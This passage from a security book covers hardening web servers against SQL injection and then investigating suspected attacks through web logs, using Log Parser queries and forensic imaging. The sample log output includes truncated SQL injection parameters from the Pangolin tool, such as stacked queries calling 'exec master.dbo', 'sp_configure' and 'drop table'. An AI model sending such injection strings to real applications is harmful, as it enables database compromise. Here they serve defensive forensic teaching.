help slow the identification of applications that are potentia lly vulnerable to SQL injection. \nThese techniques can be useful as a first layer to prevent detection by automated SQL injection worms that are becoming increasingly prevalent and dangerous. Additionally, we’ll look at techniques to slow and/or mitigate ex ploitation once SQL injection has been identified. \n\nMinimize Unnecessary Information Leakage \nIn general, leaking unnecessary information about software behavior significantly aids an \nattacker in finding weaknesses within your application. Examples include s oftware version \ninformation that can be used to footprint a potentially vulnerable version of an application, and error details related to an application failure, such as a SQL syntax error that occurs on the database server. We’re going to look at ways to suppress this information declaratively within \napplication deployment descriptor files and hardening the Web server configuration. \nSuppress Error Messages  \nError messages that include information detailing why a database call failed are extremely \nuseful in the identification and subsequent exploitation of SQL injection. Handling exceptions \nand suppression of error messages is most effective when done with application- level error \nhandlers. However, inevitably there is always the possibility of an unanticipat ed condition at \nruntime. Therefore, it is a good practice to also configure the application framework and/or Web server to return a custom response when unexpected application errors result, such as an HTTP response with a 500 status code (i.e. Internal Se rver Error). The configured response \ncould be a custom error page that displays a generic message or a redirection to the default Web page. The important point is that the page should not reveal any of the technical details related to why the exception occurred. Table 9.2 provides examples for configuring \napplications and Web servers to return a custom response when an error condition occurs. \nTable 9.2  Configuration Techniques for Displaying Custom Errors  \nPlatform  Configuration Instruction s \nASP.NET Web \napplication  In the web.config file, set customErrors to On  or RemoteOnly and \ndefaultRedirect  to the page for display. Ensure that the page configured for \ndefaultRedirect  actually exists at the configured location, as this is a \ncommon mistake!  \n<customErrors mode=“On”  \n defaultRedirect=“/CustomPage.aspx”>  \n</customErrors>  \nThis will be effective for ASP.NET resources only. Additionally, the \nPlatform  Configuration Instruction s \nconfigured page will be displayed for  any error that occurs (500, 404, etc.) \nthat is not handled by application code.  \nJ2EE Web \napplication  In the web.xml file, configure the <error- page>  element with an <error-\ncode>  and <location>  element.  \n<error-page>  \n <error-code>500</error- code>  \n <location>/CustomPage.html</location>  \n</error- page>  \nThis will be effective for resources that are specifically handled by the Java \napplication server only. Additionally, the configured page will be displayed \nfor 500 errors only.  \nClassic \nASP/VBScript \nWeb application  IIS must be configured to suppress detailed ASP error messages. You can use the following procedure to configure this setting:  \n1 In the IIS Manager Snap -In, right -click the Web site and select \nProperties . \n2 On the Home  Directory  tab, click the Configuration  button. Ensure that \nthe Send text error message to client  option is checked, and that an \nappropriate message exists in the textbox below this option.  \nPHP Web \napplication  In the php.ini file, set display_errors =  Off. Additionally, configure a default \nerror document in the Web server configuration. Refer to the instructions for Apache and IIS in the following two table entries. \nApache Web \nserver  Add the ErrorDocument  directive to Apache (inside the configuration file, \nusually httpd.conf) that points to the custom page.  \nErrorDocument 500 /CustomPage.html  \nIIS To configure custom errors in IIS you can use the following procedure:  \nPlatform  Configuration Instruction s \n1 In the IIS Manager Snap -In, right -click the Web site and select \nProperties . \n2 On the Custom Errors  tab, click the Configuration  button. Highlight the \nHTTP error to be customized and click the Edit  button. You can then \nselect a file or URL from the Message Type drop down to be used in \nplace of the default.  \nOne approach that can help make error detection difficult based on responses is to configure \nthe application and Web server to return the same response, such as a redirect to the default \nhome page irrespective of error code (401, 403, 500, etc.). Obviously, you should use caution when employing this strategy, as it can make legitimate debugging of application behavior difficult. If the application has been designed with good error handling and logging that can provide application administrators with enough detail to reconstruct the problem, this might be \na worthwhile strategy to consider.  \nUse an Empty Default Web Site  \nThe HTTP/1.1 protocol requires HTTP clients to send the Host header in the request to the Web server. To access a specific Web  site, the header value must match the host name in the \nWeb server’s virtual host configuration. If a match is not found, the default Web site content will be returned. For example, attempting to connect to a Web site by Internet Protocol (IP) address will  result in the content of the default Web site being returned. Consider the following \nexample:  \nGET / HTTP/1.1  \nHost: 209.85.229.104  \n… \n<html><head><meta http- equiv=“content- type” content=“text/html; charset=ISO- 8859-\n1”><title>Google</title>  \nHere a request has been made to 209.85.229.104, which is actually an IP address of a \nGoogle Web server. What is returned by default is the familiar Google search page. This \nconfiguration makes sense for Google because Google likely doesn’t care whether it is being \naccessed by IP address or host name; Google wants everyone on the Internet to use its service. As the owner of an enterprise Web application, you may prefer a little more anonymity and would like to avoid discovery by attackers scanning your IP address range for ports 80 and 443. To ensure that users are connecting to your Web application by host name only, which usually takes the attacker more time and effort to dig up (but is known to your users), configure the Web server’s default Web site to return a blank default Web page. Given that legitimate users usually prefer easy -to-remember host names, access attempts via IP address \ncould be a good way to detect potential intrusion attempts. Lastly, it’s worth pointing out that this is a  defense- in-depth mechanism and is not sufficient to prevent unwanted discovery, but it \ncan be especially effective against automated scanning programs (such as vulnerability scanners or even SQL injection worms) looking to identify vulnerable Web sites by IP address.  \nUse Dummy Host Names for Reverse DNS Lookups  \nAs mentioned previously that it takes a little more work to discover valid host names before a Web site can be accessed if all you have is an IP address. One way to do this is to perform a reverse domain name system (DNS) lookup on the IP address. If the I P address resolves to a \nhost name that is also valid on the Web server, you now have the information you need to connect to that Web site. However, if the reverse lookup returns something a little more \ngeneric, such as ool -43548c24.companyabc.com , you can keep unwanted attackers from \ndiscovering your Web site via reverse DNS lookups. If you’re using the dummy host name technique, ensure that the default Web site is also configured to return a blank default Web page. Again, this is a defense -in-depth mechani sm and is not sufficient to prevent unwanted \ndiscovery, but it can be effective against automated scanning programs (such as vulnerability scanners or even SQL injection worms).  \nUse Wildcard SSL Certificates  \nAnother way to discover valid host names is to e xtract them from Secure Sockets Layer (SSL) \ncertificates. One way to prevent this is the use of Wildcard SSL certificates. These certificates allow you to secure multiple subdomains on one server using the ∗ .domain.com pattern. These \nare more expensive than standard SSL certificates, but only a couple of hundred dollars more. You can find more information about Wildcard certificates and how they differ from standard SSL certificates at http://help.godaddy.com/article/567 . \nLimit Discovery Via Search Engine Hacking  \nSearch engines are another tool that attackers can use to find SQL injection vulnerabilities in \nyour Web site. There is a lot of publicly available information on the Internet, and even books dedic ated to the art of search engine hacking. The bottom line is that if you are tasked with \ndefending a public -facing Web application, you must consider search engines as another way \nfor attackers or malicious automated programs to discover your site. Most of  the major search \nengines (Google, Yahoo!, Bing, etc.) provide steps and online tools for removing your Web site content from their indexes and caches. One technique that is common across all the major search engines is the use of a robots.txt file in the root directory of your Web site, which is intended to prevent crawlers from indexing the site. Figure 9.11 shows an example robots.txt \nconfiguration, which prevents all robots from crawling all pages on the Web site. \n \nFigure 9.11  Directives Needed in a robots.txt File to Help Prevent Search Engine Crawling  \nGoogle notes, how ever, that this may not be sufficient to prevent indexing by its crawler if \nyour site is linked to from another site. Google recommends that you also use the noindex  meta \ntag, as shown in Figure 9.12. \n \nFigure 9.12  HTML noinde x Meta Tag to Help Prevent Search Engine Indexing  \nHere are a few links from the popular search engines to help protect your Web pages from \nunwanted discovery:  \n• www.g oogle.com/support/webmasters/bin/answer.py?hl=en&answer=35301 \n• http://onlinehelp.microsoft.com/en -us/bing/hh204505.aspx \nDisable Web Services Description Language (WSDL) Information  \nWeb services are often just as vulnerable to SQL injection as Web applications. To find \nvulnerabilities in Web services, attackers need to know how to communicate with the Web service, namely the supported communication protocols (e.g. SOAP, HTTP GET, etc.) , method \nnames, and expected parameters. All of this information can be extracted from the Web Services Description Language (WSDL) file of the Web service. Usually can be invoked by \n\nappending a ?WSDL  to the end of the Web service URL. Whenever possible, i t is a good idea \nto suppress this information from unwanted intruders.  \nFigure 9.13  shows how to configure a .NET Web service so that it does not display the \nWSDL. You can apply this configuration change to the applica tion web.config or \nmachine.config file.  \n \nFigure 9.13  Configuration to Disable the Display of .NET Web Service WSDL Information  \nApache Axis, a commonly used Simple Object Access Protocol (SOAP) Web service \nplatform for Java applications, supports custom configuration of the WSDL file, which can be \nused to suppress auto -generation. You can configure the wsdlFile  setting in the service’s .wsdd \nfile to point to a file that returns an empty <wsdl/>  tag. \nIn general, leaving WSDL information remotely accessible on Internet -facing Web servers \nis strongly discouraged.  You can use an alternative secured communication channel, such as \nencrypted e- mail, to provide this file to trusted partners who may need this information to \ncommunicate with the Web service.  \nIncrease the Verbosity of Web Server Logs  \nWeb server log files can provide some insight into potential SQL injection attacks, especially when application logging mechanisms are below par. If the vulnerability is in a URL parameter, Apache and IIS will log this information by default. If you’re defending a Web applicat ion that has poor logging facilities, consider also configuring your Web server to log \nthe Referer and Cookie headers. This will increase the size of the log file, but provides potential security benefits with insight into Cookie and Referer headers, which are another \npotential location for SQL injection vulnerabilities to materialize. Both Apache and IIS require the installation of additional modules to log POST  data. Refer to “Using runtime protection” \nfor techniques and solutions to add monitoring and intrusion detection facilities to your Web application. \nDeploy the Web and Database Servers on Separate Hosts  \n\nYou should avoid running the Web and database server software on the same host. This \nsignificantly increases the attack surface of the Web applicati on and may expose the database \nserver software to attacks that previously were not possible given access to the Web front end only. For example, the Oracle XML Database (XDB) exposes an HTTP server service on Transmission Control Protocol (TCP) port 8080. This is now an additional entry point for probing and potential injection. Additionally, the attacker could leverage this deployment scenario to write query results to a file in a Web -accessible directory and view the results in \nthe Web browser.  \nConfigure Network Access Control  \nIn networks that are properly layered, database servers are typically located on internal trusted networks. Usually this segregation is beneficial to thwart network- based attacks; however, this \ntrusted network can be breach ed via a SQL injection vulnerability in an Internet -facing Web \nsite. With direct access to the database server, the attacker can attempt to connect to other systems on the same network. Most database server platforms offer one or more ways for initiating n etwork connections. Given this, consider implementing network access controls to \nrestrict connections to other systems on the internal network. You can do this at the network layer with firewall and router ACLs or by using a host -level mechanism such as IP Sec. \nAdditionally, ensure that proper network access controls are in place to prevent outbound network connections as these can be leveraged by attackers to tunnel database results out of the network via an alternative protocol such as DNS or the database server’s own network protocol. \nSummary  \nPlatform security is an important part of the overall security architecture of any Web application. You can deploy runtime protection techniques, such as Web server and application -level plug -ins, without modifying ap plication code to detect, prevent, or mitigate \nSQL injection. The best runtime solution will depend on the technologies and platforms that make up the application environment. You can harden database servers to significantly mitigate the scope of compromis e (i.e. application, server, and/or network compromise) and \nunauthorized data access. In addition, you can leverage network architectural changes and a secured Web infrastructure configuration to mitigate and lessen the chances of detection.  \nIt is importan t to remember that platform security is not a substitute for addressing the real \nproblem: the insecure coding patterns that cause SQL injection in the first place. A hardened \nnetwork and application infrastructure combined with runtime monitoring and tuned  \nprevention provide a formidable defense to thwart the SQL injection vulnerabilities that may \nbe present in the code. Platform -level security is an important component to the overall \nsecurity strategy for both existing and new applications.  \nSolutions fast track  \nUsing Runtime Protection  \n• Runtime protection is an effective technique for addressing SQL injection when code \nchanges are not possible.  \n• Web application firewalls can provide effective detection, mitigation, and prevention of SQL \ninjection when properly tuned. \n• Runtime protection spans multiple layers and tiers, including the network, Web server, \napplication framework, and database server.  \nSecuring the Database \n• Hardening the database will not stop SQL injection, but can significantly reduce the i mpact.  \n• Attackers should be sandboxed to application data only. In a locked- down database server, \ncompromise of other databases and systems on connected networks should not be possible. \n• Access should be restricted to only required database objects, such as EXECUTE \npermissions on stored procedures only. In addition, judicious use of strong cryptography on sensitive data can prevent unauthorized data access.  \nAdditional Deployment Considerations  \n• A hardened Web -tier deployment and network architecture will not stop SQL injection, but \ncan significantly reduce its impact.  \n• When faced with the threat of automated attackers, such as SQL injection worms, \nminimizing information leakage at the network, Web, and application layers will help lessen the chances of d iscovery.  \n• A properly architected network should only allow authorized connections to the database \nserver, and the database server itself should not be permitted to make outbound connections.  \nFrequently asked questions  \nQ: When is the use of runtime protec tion appropriate?  \nA: Runtime protection can help mitigate or even patch known vulnerabilities, as well as \nprovide a first line of defense against unknown threats. When code changes are not possible in \nthe near term, you should use runtime protection. Addit ionally, the detection capabilities of \ncertain runtime solutions make it ideal for use on every production Web application. When configured in logging mode, runtime protection provides an excellent application intrusion detection system and can generate au dit logs for forensic analysis if necessary.  \nQ: We just deployed a Web application firewall (WAF), so we’re safe, right?  \nA: No. Do not expect to deploy a WAF, flip the switch, and receive instant protection. WAFs \nout-of-the-box are most effective for detecting attacks and applying virtual patches to specific \nvulnerable Web pages or URLs. Be careful of blocking traffic until the WAF has been through a learning phase and has been highly tuned.  \nQ: ModSecurity is great, but we don’t run Apache in our environment. What are some free \nalternatives for Microsoft IIS?  \nA: UrlScan and WebKnight are both free ISAPI filters that you can plug into IIS with minimal \neffort. WebKnight is a better choice if you are concerned about protecting POST  data from \nSQL injection attac ks. You can also look into using ASP.NET HttpModules, which you can \nuse with additional Web server configuration to protect virtually any Web application capable of running on IIS. Look into Secure Parameter Filter and keep an eye on module developers now that IIS 7.0 and up support managed code in the IIS request/response handling pipeline.  \nQ: Why can my application database login view certain system objects? What can I do to \nprevent this?  \nA: This occurs because virtually every database platform comes with a default role that all \nlogins are mapped to. This role, usually called the public role, has a set of default permissions which often include access to many system objects, including some adm inistrative stored \nprocedures and functions. At a minimum, revoke any permissions that the public role may have in your application database. Wherever possible, revoke PUBLIC permissions from databasewide system objects. A database audit of PUBLIC role per missions is a good starting \npoint to determine the potential exposure and corrective action that can be taken to lock it \ndown. \nQ: Should we store passwords encrypted, or a hash of the password in the database?  \nA: It’s usually best not to store anything sensitive if you don’t have to. When it comes to \npasswords, storing a hash of the password is preferable over storing the password encrypted. \nThis alleviates key management issues associated with  encryption and forces an attacker to \nbrute -force hashes should access to the passwords be obtained. Ensure that each password is \nsalted with a unique value to prevent compromise of identical accounts should a hash actually be cracked. Lastly, use industry -approved cryptographically secure hashing algorithms only, \nsuch as one of the SHA -2 family (SHA256, SHA384, SHA512) or for even more secure \nhashes, an algorithm specifically designed for hashing passwords such as bcrypt or scrypt.  \nQ: Our application has very little logging capabilities and we’d like a little more insight into \npotential SQL injection attacks. How can we add this into our environment without changing the application?  \nA: There are a number of steps you can take. Rather than adding modules to your application \nfrom the start, you may want to begin with the Web server log files. All Web servers keep a \nlog of requests and response status codes by default. You can usually customize them to \ncapture additional data, although you’ll still be missing some insight into POST  data as this is \nnot logged. Web application firewalls can be a nice supplement, as they usually support the ability to log entire request and response transactions. Additionally, there are a number of freely available logging modules that you can deploy with your application and that require only a configuration change.  \nQ: Are there ways to hide my Web site from attackers, but at the same time still make my site \neasily accessible to my customers?  \nA: A determined attacker will always find your Web site; however, there are some basic things \nyou can do to at least minimize detection by automated scanners and worms. Set up your Web server so that the default Web site returns a blank page, use a Wildcard SSL certificate, and configure reverse DNS lookups so that the Web server IP address does not resolve  to a host \nname configured on the Web server. If you are really paranoid, request that your site be removed from the index of popular search engines, such as Google.  \nQ: I have a thick client application that needs to be hardened against SQL injection. What  can \nI do without changing any code?  \nA: If it talks to an application server over HTTP, many of the same runtime solutions used for \nWeb applications also apply to thick client applications. Web services should be hardened so \nthat the Web Services Descripti on Language (WSDL) file is returned when requested. If the \napplication performs data access, all of the normal database lockdown procedures apply. If the client connects directly to the database, consider the use of a database firewall. In this scenario, you will need to configure network access controls so that the database firewall cannot be \nbypassed.  \n \n \n \n  \n \n  \n \n \n \n \n \nChapter 10  \nConfirming and Recovering from SQL \nInjection Attacks  \nKevvie Fowler  \nSolutions in this chapter:  \n• Investigating a Suspected SQL Injection Attack  \n• So, You’re a Victim —Now What?  \nIntroduction  \nSQL injection is the attack of choice for hackers and is used in many of the information \nsecurity breaches that continue to create headlines week after week. These breaches often cause devastating damage to an org anization’s reputation and carry financial penalties and loss \nof business which can force a firm out of business. With businesses facing these consequences they often task information security professionals with proactively detecting and leading the remedi ation of SQL injection vulnerabilities within their applications. In many organizations \nnew SQL injection vulnerabilities seem to be introduced before the known ones can be fixed. Whether it is the result of ignoring security testing in the rush to push ne w applications into \nproduction or lack of security integration into the software development life cycle, many organizations have SQL injection exposures that serve as key targets for hackers.  \nInevitably, hackers will find and exploit these vulnerabilities and SQL injection- related \nincidents will be brought to the attention of incident response teams and forensics professionals to review, validate, and respond to. In this chapter we will walk you through the steps required to confirm or discount a successful  SQL injection attack and help you to \nunderstand what you can to do to minimize business impact by effectively containing or recovering from an attack.  \n \n \nInvestigating a suspected SQL injection attack  \nIn Chapter 2 we looked at how to test for SQL injection vulnerabilities within applications and \nhow to confirm identified vulnerabilities. These techniques are  straight forward when a \nsecurity professional (or attacker) is on the other end of a web browser receiving the responses \nto SQL injection tests in near real- time. Investigators have a much more difficult job of sifting \nthrough a deluge of information after a suspected attack has occurred to determine not only if there is evidence of an attempted SQL injection att ack but also if the attack was successful.  \nThe steps we are about to walk through are intended for computer security incident \nresponders and forensics professionals authorized to perform investigations within an organization. Other readers can practice these steps in academic settings or follow along as general awareness.  \nFollowing Forensically Sound Practices  \nDespite the growth in and awareness of the field of computer forensics experienced over the past 10 years there are still countless investigations that involve evidence that could not be admitted to legal proceedings due to improper collection, handling, or management by unqualified individuals. In most jurisdictions there are strict rules and guidelines governing how digital evidence must be gathered and managed if it is to be admissible in a court of law. Common requirements include:  \n1. Individuals traine d in computer forensics and authorized to perform digital investigations \nwithin an organization should handle investigations. \n2. All files gathered during an investigation should be imaged and a duplicate image should be \ncreated for analysis. This ensures there is always an original image available if needed.  \n3. A hash should be generated on each newly created file image as well as one on the source \nfile. For example, if gathering a web server log file, the log file on the server would be imaged and a hash would be created on the original source file as well as the new image (copy) you just created to ensure they match and the file was copied correctly without corruption. A specialist tool such as dcfldd should be used to image as it is reliable, flexible and will automatically generate hashes on both the original and newly created image. The \nfollowing syntax is an example that will image the C:\\ logs\\postgresql.log file to z: \\ and \ngenerate SHA1 hashes on both to ensure they match, storing the hashes within the z:\\postgresql.sha1 file:  \ndcfldd if=“C: \\logs\\postgresql.log”  \nof=z:\\postgresql.dcfldd hash=sha1 hashlog=z:\\ postgresql.sha1  \n4. Document all actions you perform during your investigation, including those completed \nwhen connected to the database server:  \n• Keep a record of the time of your connection and the user context that was used.  \n• Keep a record of the commands you executed within the RDBMS.  \n• Pipe all results to a text file. There are multiple methods you can use to redirect stdout from \nyour database cli ent console to a text file. Table 10.1 contains a listing of Stdout \nredirection commands for popular RDBMS clients. \nTable 10.1  Stdout Redirection Commands for Popular RDBMS Clients  \n \n5. Ensure all evidence is written to sterile storage media and stored in a secure location such as \na locker/safe.  \n6. Maintain a Chain of Custod y documents which tracks the movement, location, and \nownership of all gathered evidence from the time it is preserved up until it is presented \nwithin a court of law.  \nDuring an investigation you can’t disregard these guidelines and then, once you’ve \nconfirm ed a successful SQL injection attack has occurred, roll back the hands of time and redo \nyour analysis this time following proper court approved methods. It can’t be emphasized enough that in order to ensure you don’t invalidate any possible  future case you  may have it’s \nimperative the above guidelines are adhered to from the onset of any investigation—even \n\nbefore you verify if an attack has been successful or whether or not future legal action is \nplanned.  \nWith an understanding of how to manage the evidence you gather during your investigation \nlet us jump into the actual artifacts that will contain the information you’ll need in order to confirm or discount a successful SQL injection attack.  \nAnalyzing Digital Artifacts  \nDigital artifacts are collections of related data. They range from web server log files stored within the operating system’s file system to information stored in memory or within the internals of a RDBMS. There are dozens of database artifacts. In this chapter the focus will be on a few of the a rtifacts most beneficial when investigating a SQL injection attack —Web \nServer logs, database execution plans, the transaction log, and Database object timestamps. Though most of these artifacts exist across Microsoft SQL Server, Oracle, MySQL, and PostgreS QL RDBMS products, the scope of information within and the method used to access \nit will vary. We’ll step through each of these artifacts beginning with web server log files which are the single most important artifact you’ll need to investigate a potentia l breach.  \nWeb Server Log Files  \nWeb servers are core components of web -based applications and serve as the interaction layer \nreceiving user input and passing it to back- end applications. Web servers usually maintain a \npersistent log file that contains a his torical record of the page request it received and the \noutcome of the request in the form of a status code. The amount of information logged is customizable by a system administrator, however major web server products such as Microsoft IIS and Apache have logging of basic information enabled by default.  \nWeb server logging attributes most beneficial in a SQL injection investigation are captured \nin Table 10.2. \nTable 10.2  Web Server Log Attributes Most Beneficial in a SQL  Injection Investigation  \nLog Field Name  Description  Primary Investigative Valu e \nDate  Date of activity  Establish a timeline of events and to correlate \nLog Field Name  Description  Primary Investigative Valu e \nevents across artifacts  \nTime  Time of activity  Establish a timeline of events and to correlate \nevents across artifacts  \nClient- IP \nAddress (c -ip) IP address of the requesting \nclient  Identify source of web requests  \nCs-UserName  Name of the authenticated user \nmaking the request  Identify user context associated with traffic  \nCs-method Requested action  HTTP action the client was attempting to \nperform  \nCs-uri-stem  Request target (i.e. requested \nWeb page)  The resources (pages, executables, etc.) \naccessed by the client  \nCs-uri-query  Query requested by the client  Identify malicious queries submitted by the \nclient  \nSc-status  Status code of client request  Identify the outcome (status) of processing \nthe client request  \nCs(User -Agent)  Version of browser used by the \nclient  Tracing requests back to specific clients who \nmay be using multiply IP addresses  \nCs-bytes  Bytes sent from client to server  Identify abnormal traffic transmissions  \nSc-bytes  Bytes sent from server to client  Identify abnormal traffic transmissions  \nLog Field Name  Description  Primary Investigative Valu e \nTime Taken \n(time -taken)  Server milliseconds taken to \nexecutes the request  Identify instances of abnormal request \nprocessing  \nThis information holds critical information about both legitimate and malicious acc ess \nattempts, such as those generated in response to a SQL injection attack, and will be critical \nwhen analyzing log file data.  \nBy default Web servers persistently store log data in text files within the file system of the \noperating system. Web server logs  can range in size from a few megabytes to multi -gigabyte \nfiles. Due to the sheer volume of data within large web server log files, it’s far more efficient to use a log analyzer instead of manually reviewing contents for attacks. Log Parser is a tool devel oped by Microsoft that is vendor neutral, supports log file formats used by IIS and \nApache and allows you to use the flexibility, speed, and precision of SQL to analyze huge log files in a very time efficient manner.  \nWhen you begin an investigation, you wi ll typically have few details about the suspected \nSQL injection attack and will need to perform a broad analysis of the web log file. A good place to start is looking for dates with an abnormally high numbers  of web requests or \nbandwidth usage. The followi ng are examples of how to do both using Log Parser:  \nBandwidth utilization by day:  The following example analyzes IIS log files and returns \nthe amount of kilobytes transferred to and from the webserver each day. Note for the following query the cs -bytes and  sc-bytes fields (which are not enabled by default) must be enabled:  \nlogparser “Select To_String(To_timestamp(date, time), ‘MM- dd’) As Day, Div(Sum(cs-\nbytes),1024) As Incoming(K), Div(Sum(sc -bytes),1024) As Outgoing(K) Into \nz:\\Bandwidth_by_day.txt From C:\\ inetpub\\ logs\\LogFiles\\ W3SVC2\\u_ex∗.log Group By Day”  \nSample results are as follows:  \nDay Incoming(K) Outgoing(K)  \n----- ----------- -----------  \n… \n07-21 800 94  \n07-30 500 101  \n01-10 300 100  \n01-27 1059 2398  \n01-28 1106 2775  \n… \nNumber of page hits per day:  The following query will return the number of times each \nASP page and executable file was requested, grouped by date:  \nlogparser “SELECT TO_STRING(TO_TIMESTAMP(date, time), ‘yyyy- MM-dd’) AS Day, cs- uri-stem, \nCOUNT(∗) AS Total FROM C:\\ inetpub\\logs\\LogFiles \\W3SVC1\\u_ex∗.log WHERE (sc- status<400 or \nsc-status>=500) AND (TO_LOWERCASE(cs- uri-stem) LIKE ‘%.asp%’ OR TO_LOWERCASE(cs- uri-stem) \nLIKE ‘%.exe%’) GROUP BY Day, cs- uri-stem ORDER BY cs- uri-stem, Day ” -rtp:-1 \nAlthough some pages in a website will be accessed more than others you should review the \nresults to identify pages and objects with an unusually high number of hits when compared to \nhits of other days. The following results show a spike in the number of hits December 8th, which should be investigated furt her: \nDay cs-uri-stem Total  \n----------  -------------- -----  \n… \n2011-05-15 /defalut.aspx 123  \n2011-03-31 /default.aspx 119  \n2011-12-07 /default.aspx 163  \n2011-12-08 /default.aspx 2109  \n2011-12-09 /default.aspx 204  \n… \nNumber of page hits per day, by IP:  Digging dow n a little deeper the following query can \nbe used to return a listing of recorded IP’s and the resources they access per day which should \nbe reviewed focusing in on specific IP address and hit combinations with a high hit count:  \nlogparser “SELECT DISTINCT date, cs- uri-stem, c- ip, Count(∗ ) AS Hits FROM \nC:\\inetpub\\logs\\LogFiles \\W3SVC1\\u_ex∗.log GROUP BY date, c- ip, cs-uri-stem HAVING Hits> 40 \nORDER BY Hits Desc ” -rtp:-1 \ndate cs- uri-stem c-ip Hits  \n----------  -------------------- ------------ ---- \n… \n2010-11-21 /EmployeeSearch.aspx 192.168.1.31 902  \n2011-03-19 /employeesearch.aspx 192.168.1.8 69  \n2011-03-21 /employeesearch.aspx 192.168.1.8 44  \n2010-11-21 /EmployeeSearch.aspx 192.168.1.65 41  \n2011-12-08 /employeesearch.aspx 192.168.1.8 1007  \n2011-03-19 /employeesearch.aspx 192.168.1.50 95  \n2011-05-15 /employeesearch.aspx 192.168.1.99 68  \n2011-03-21 /employeesearch.aspx 192.168.1.50 59  \n… \nNote that SQL injection vulnerabilities are often exploited by the same attacker over \nmultiple dates. During this timeframe, the same attacker may connect from different physical locations or bounce off different proxies in order to change his associated IP address. To help identify this you should compare the client information stored within the c -ip attribute ac ross \nmultiple IP’s with high hit counts to see if there is a match, indicating it may be the same client at the other end of the connection. The following query can be run that will analyze web logs \nand compare client information such as Operating System, local version of .Net, and patch \nlevel against two supplied IP addresses:  \nlogparser “SELECT DISTINCT c- ip, cs(User -Agent) FROM ex030622.log WHERE c- ip=‘198.54.202.2’ \nor c-ip=‘62.135.71.223’” -rtp:-1 \nYou should look for similar client versions and software within the results as in the \nfollowing example: \n… \n192.168.6.51 Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+6.1;+W…  \n192.168.6.131 Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+6.1;+…  \n… \nThere is some room for error with the above as it is theoretically pos sible for two different \nmachines to have matching Operating System versions, client software, and patches. You can further your analysis by comparing the web requests between the two suspected clients to further determine if it is likely the same machine c onnecting from different IP addresses.  \nAt this point you should have an understanding of the web pages or executable targeted by \nattackers as well as the timeframe during which the attack is thought to have occurred. This information can be used to zero in on malicious activity by looking for malicious query \nparameters and a technique I like to call spear -searching.  \nMalicious Query parameters:  The following is an example of a query that will return a \nlisting of all query parameters submitted to a web applic ation, the source IP address, and the \nnumber of times the parameter was sent:  \nlogparser -rtp:-1 -o:w3c “SELECT cs- uri-query, COUNT(∗ ) AS [Requests], c- ip INTO \nz:\\Query_parameters.log FROM C:\\ inetpub\\ logs\\LogFiles\\ W3SVC1\\u_ex∗.log WHERE cs- uri-query \nIS NOT null GROUP BY cs -uri-query, c- ip ORDER BY cs- uri-query”  \nThe following is a fragment of the preceding query’s result, which shows a variety of query \nparameters containing malicious SQL injection syntax:  \n… \nName=Mikaela 1 192.168.6.121  \nName=Isaiah 1 192.168.6 .121 \nName=Corynn 1 192.168.6.121  \nName=Lory 1 192.168.6.136  \nName=Jarrell 1 192.168.6.136  \nName=Mekhi 3 192.168.0.111  \nName=Elijah 2 192.168.1.65  \nName=Emerson 1 192.168.6.136  \nName=Ronan 1 192.168.6.136  \nName=Mikaela’%20;create%20table%20[pangolin_test_table]([a]%20nva…  \nName=Mikaela’%20;create%20table%20[pangolin_test_table]([resulttx…  \nName=Mikaela’%20;create%20table%20pangolin_test_table(name%20nvar…  \nName=Mikaela’%20;create%20table%20pangolin_test_table(name%20nvar…  \nName=Mikaela’%20;declare%20@s%20nvarchar(4000)%20exec%20master.db…  \nName=Mikaela’%20;declare%20@z%20nvarchar(4000)%20set%20@z=0x43003…  \nName=Mikaela’%20;declare%20@z%20nvarchar(4000)%20set%20@z=0x61007…  \nName=Mikaela’%20;drop%20table%20[pangolin_test_table]; -- 2 192.16…  \nName=Mikaela’%20;drop%20table%20pangolin_test_table;--  6 192.168….  \nName=Mikaela’%20;drop%20table%20pangolin_test_table;create%20tabl…  \nName=Mikaela’%20;drop%20table%20pangolin_test_table;create%20tabl…  \nName=Mikaela’%20;exec%20sp_configure%200x41006400200048006f006300…  \nName=Mikaela’%20;exec%20sp_configure%200x730068006f00770020006100…  \nName=Mikaela’%20;insert%20pangolin_test_table%20exec%20master.dbo…  \nName=Mikaela’%20;insert%20pangolin_test_table%20exec%20master.dbo…  \nName=Mikaela’%20and%20(select%20cast(count(1)%20as%20varchar(8000…  \nName=Mikaela’%20and%20(select%20cast(count(1)%20as%20varchar(8000…  \n… \nSpear -searching:  Allows you to specifically look for evidence of known malicious act ivity. \nThe next query searches all webserver log files for the keyword “Pangolin”:  \nlogparser -i:iisw3c “select date,time,cs- uri-stem,cs-uri-query from \nC:\\inetpub\\logs\\LogFiles \\W3SVC1\\u_∗.∗ where cs- uri-query like ‘ %pangolin% ’” -o:csv  \nResults similar to the  following are returned which show several malicious queries launched \nby the Pangolin SQL injection exploitation tool:  \ndate,time,cs- uri-stem,cs-uri-query  \n2010-11-21,12:57:42,/EmployeeSearch.aspx,Name=TEmpdb’%20;drop%20table%20pan…  \n2010-11-21,12:57:42,/EmployeeSearch.aspx,“Name=TEmpdb’%20;create%20table%20…  \n2010-11-21,12:57:48,/EmployeeSearch.aspx,Name=TEmpdb’%20;insert%20pangolin_…  \n2010-11-21,12:57:48,/EmployeeSearch.aspx,“Name=TEmpdb’%20and%200%3C(select%…  \n2010-11-21,12:57:48,/EmployeeSearch.aspx,“Name=TEmpdb’%20and%200%3C(select%…  \n2010-11-21,12:57:48,/EmployeeSearch.aspx,Name=TEmpdb’%20;drop%20table%20pan…  \n2010-11-21,12:57:48,/EmployeeSearch.aspx,Name=TEmpdb’%20;drop%20table%20pan…  \n2010-11-21,12:57:48,/EmployeeSearch.aspx,“Name=TEmpdb’%20;create%20table%20…  \n2010-11-21,12:57:48,/EmployeeSearch.aspx,Name=TEmpdb’%20;insert%20pangolin_…  \n2010-11-21,12:57:48,/EmployeeSearch.aspx,“Name=TEmpdb’%20and%200%3C(select%…  \n2010-11-21,12:57:48,/EmployeeSearch.aspx,“Name=TEmpdb’%20and%200%3C(select%…  \n2010-11-21,12:57:48,/EmployeeSearch.aspx,Name=TEmpdb’%20;drop%20table%20pan…  \n2010-11-21,13:01:22,/EmployeeSearch.aspx,Name=TEmpdb’%20;drop%20table%20pan…  \n2010-11-21,13:01:22,/EmployeeSearch.aspx,“Name=TEmpdb’%20;create%20table%20…  \nThe last query we will lo ok at to detect SQL injection attacks within web server logs are IP \naddresses that received an unusually high amount of data from a web server. During a SQL \ninjection attack an attacker will often send a high amount of  traffic to the server as he attempts \nto locate and exploit a SQL injection vulnerability. This activity typically generates HTTP responses and general server errors. The payload of many SQL injection attacks is the transfer of information from a vulnerable webserver to an attacker’s 